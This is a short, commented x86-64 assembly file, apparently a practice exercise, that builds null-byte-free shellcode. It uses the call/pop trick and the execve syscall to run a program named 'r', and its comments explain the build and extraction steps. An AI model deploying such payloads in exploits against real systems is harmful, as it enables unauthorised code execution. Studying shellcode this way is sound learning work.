# build with gcc -nostdlib -static testshell.s -o testshell-elf
# objdump -M intel -d testshell-elf
# get shellcode with objcopy --dump-section .text=shellcode-raw testshell-elf

# shellcode cant have \x00 null bytes
# mov and lea generate \x00 null bytes
# using push to put the value on the stack and using pop to send the value to the register
# using .ascii instead of .string because .string puts a null byte at the end of the string

.global _start
_start:
.intel_syntax noprefix
main:
	pop rdi # first argument for execve is the name of the executable, getting from the stack

	xor rsi, rsi # second argument to execve, argv, NULL. 

	xor rdx, rdx # third argument to execve, envp, NULL

	push 59 # syscall execve
	pop rax

	syscall # callllinnnngggg

executable:
    call main # calling from here will put the .string address on the stack as ret address
	.ascii "r" # executable path/name whatever # .string put a null byte in the end, use ascii instead
